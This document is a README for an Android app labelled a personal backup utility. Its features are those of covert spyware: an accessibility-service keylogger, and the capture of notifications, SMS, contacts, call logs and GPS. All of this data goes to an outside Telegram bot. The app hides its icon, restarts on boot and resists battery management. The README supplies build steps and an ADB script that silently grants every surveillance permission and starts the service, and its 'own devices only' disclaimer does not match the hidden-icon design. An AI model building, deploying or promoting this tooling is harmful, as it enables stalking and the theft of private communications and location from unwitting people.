# DeviceSync Utility

Personal device management and backup utility for Android. Collects device data and forwards notifications to Telegram for personal backup/archival purposes.

**For personal use only on your own devices.**

## Features

- **Persistent Foreground Service** — survives doze mode with partial wake lock
- **Notification Capture** — forwards all notifications to Telegram in real-time
- **Periodic Data Sync** — collects GPS, SMS, contacts, call logs every 15 minutes
- **Text Input Tracking** — accessibility service captures typed text, batched every 30 seconds
- **Boot Persistence** — automatically restarts on device reboot
- **Self-Hiding** — hides launcher icon after initial setup

## Project Structure

```
DeviceSync-Utility/
├── build.gradle                          # Project-level Gradle config
├── settings.gradle                       # Module settings
├── gradle.properties                     # Gradle properties
├── app/
│   ├── build.gradle                      # App-level dependencies (OkHttp, WorkManager, FusedLocation)
│   ├── proguard-rules.pro                # ProGuard rules
│   └── src/main/
│       ├── AndroidManifest.xml           # All permissions + service declarations
│       ├── java/com/devicesync/utility/
│       │   ├── MainActivity.kt           # Permission handler + service starter
│       │   ├── ForegroundService.kt      # Persistent notification + wake lock
│       │   ├── BootReceiver.kt           # BOOT_COMPLETED receiver
│       │   ├── NotificationListenerService.kt  # Notification capture → Telegram
│       │   ├── DataSyncWorker.kt         # WorkManager periodic data collection
│       │   ├── TelegramHelper.kt         # OkHttp client with retries
│       │   └── AccessibilityHelper.kt    # Text input tracking service
│       └── res/
│           ├── layout/activity_main.xml
│           ├── values/strings.xml        # Contains BOT_TOKEN and CHAT_ID
│           └── xml/accessibility_service_config.xml
```

## Configuration

Edit `app/src/main/res/values/strings.xml`:

```xml
<string name="bot_token">123456789:ABCdefGHIjklMNOpqrsTUVwxyz</string>
<string name="chat_id">123456789</string>
```

**Get your Bot Token:** Message [@BotFather](https://t.me/BotFather) on Telegram, create a bot, copy the token.

**Get your Chat ID:** Message [@userinfobot](https://t.me/userinfobot) on Telegram, it will reply with your user ID.

## Building on Android (AIDE / Java N-IDE)

### Option 1: AIDE (Android IDE)

1. Install **AIDE** from Play Store
2. Create new project → "Android App (Gradle)"
3. Replace generated files with the files from this repository
4. In AIDE, open `app/build.gradle` and ensure dependencies are synced
5. Tap **Run** to build and install

### Option 2: Java N-IDE

1. Install **Java N-IDE** from Play Store
2. New Project → Android Gradle
3. Copy all project files maintaining the directory structure
4. Edit `strings.xml` with your bot token and chat ID
5. Build → Build APK

### Option 3: Terminal Build (Termux)

Install required packages:
```bash
pkg update
pkg install gradle openjdk-17 git
```

Clone and build:
```bash
cd /storage/emulated/0/Download
git clone https://github.com/YOUR_USERNAME/DeviceSync-Utility.git
cd DeviceSync-Utility
gradle assembleDebug
```

APK will be at:
```
app/build/outputs/apk/debug/app-debug.apk
```

## Signing & Release Build (Optional)

### Generate Keystore in Termux

```bash
keytool -genkey -v -keystore devicesync.keystore -alias devicesync -keyalg RSA -keysize 2048 -validity 10000
```

Configure signing in `app/build.gradle`:
```gradle
android {
    signingConfigs {
        release {
            storeFile file("/path/to/devicesync.keystore")
            storePassword "YOUR_STORE_PASSWORD"
            keyAlias "devicesync"
            keyPassword "YOUR_KEY_PASSWORD"
        }
    }
    buildTypes {
        release {
            signingConfig signingConfigs.release
            minifyEnabled false
            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
        }
    }
}
```

Build release:
```bash
gradle assembleRelease
```

## Installing the APK

### Via ADB (from PC)
```bash
adb install -r app-debug.apk
```

### Via ADB (from Termux)
```bash
pkg install android-tools
adb install -r app/build/outputs/apk/debug/app-debug.apk
```

### Via File Manager
1. Copy APK to device storage
2. Open file manager, navigate to APK
3. Tap to install
4. Enable "Install from unknown sources" if prompted

### Via Terminal (Termux - rootless)
```bash
# Grant Termux install permission first
settings put secure install_non_market_apps 1

# Install using pm (requires shell/ADB permissions)
pm install -r /storage/emulated/0/Download/app-debug.apk
```

## Required Manual Grants After Install

### 1. Notification Access
**Settings → Apps → Special access → Notification access → DeviceSync Utility → Allow**

Or via ADB:
```bash
adb shell settings put secure enabled_notification_listeners com.devicesync.utility/com.devicesync.utility.NotificationListenerService
```

### 2. Accessibility Service
**Settings → Accessibility → DeviceSync Utility → Enable**

Or via ADB:
```bash
adb shell settings put secure enabled_accessibility_services com.devicesync.utility/com.devicesync.utility.AccessibilityHelper
```

### 3. Ignore Battery Optimization
**Settings → Apps → DeviceSync Utility → Battery → Unrestricted**

Or via ADB:
```bash
adb shell dumpsys deviceidle whitelist +com.devicesync.utility
```

### 4. Background Location (Android 10+)
**Settings → Apps → DeviceSync Utility → Permissions → Location → Allow all the time**

### 5. Display Over Other Apps (if needed)
**Settings → Apps → Special access → Display over other apps → DeviceSync Utility → Allow**

## All-in-One ADB Setup Script

```bash
#!/bin/bash
PKG="com.devicesync.utility"

echo "Granting all permissions..."

# Runtime permissions
adb shell pm grant $PKG android.permission.ACCESS_FINE_LOCATION
adb shell pm grant $PKG android.permission.ACCESS_COARSE_LOCATION
adb shell pm grant $PKG android.permission.ACCESS_BACKGROUND_LOCATION
adb shell pm grant $PKG android.permission.READ_SMS
adb shell pm grant $PKG android.permission.READ_CONTACTS
adb shell pm grant $PKG android.permission.READ_CALL_LOG
adb shell pm grant $PKG android.permission.READ_PHONE_STATE
adb shell pm grant $PKG android.permission.POST_NOTIFICATIONS 2>/dev/null

# Special access
adb shell settings put secure enabled_notification_listeners $PKG/com.devicesync.utility.NotificationListenerService
adb shell settings put secure enabled_accessibility_services $PKG/com.devicesync.utility.AccessibilityHelper
adb shell dumpsys deviceidle whitelist +$PKG

echo "Starting service..."
adb shell am startservice -n $PKG/com.devicesync.utility.ForegroundService

echo "Done!"
```

## Verification

After setup, check Telegram for messages from your bot:
- Notification test: Send yourself a notification from another app
- Data sync: Wait up to 15 minutes or trigger manually via ADB:
  ```bash
  adb shell am broadcast -a android.intent.action.BOOT_COMPLETED -p com.devicesync.utility
  ```
- Text input: Type in any app, wait 30 seconds, check Telegram

## Troubleshooting

| Issue | Solution |
|-------|----------|
| "App not installed" | Uninstall previous version first; check signing |
| No Telegram messages | Verify bot token and chat ID; check internet |
| Service killed | Grant all battery optimizations; lock app in recents |
| Missing permissions | Re-run MainActivity or grant via ADB |
| Accessibility not working | Re-enable in Settings → Accessibility |
| Notification access lost | Re-grant in Settings → Apps → Special access |

## Technical Notes

- **Target SDK**: 33 (Android 13)
- **Min SDK**: 26 (Android 8.0)
- **Architecture**: Foreground service + WorkManager + Accessibility Service + Notification Listener
- **Network**: All operations async via OkHttp with 3 retries
- **Wake Lock**: Partial wake lock, 10-minute timeout, auto-reacquired
- **Doze**: Foreground service + wake lock ensures operation during doze

## Disclaimer

This tool is designed for **personal device backup and management only**. Use only on devices you own. The developer assumes no liability for misuse or unauthorized data collection.
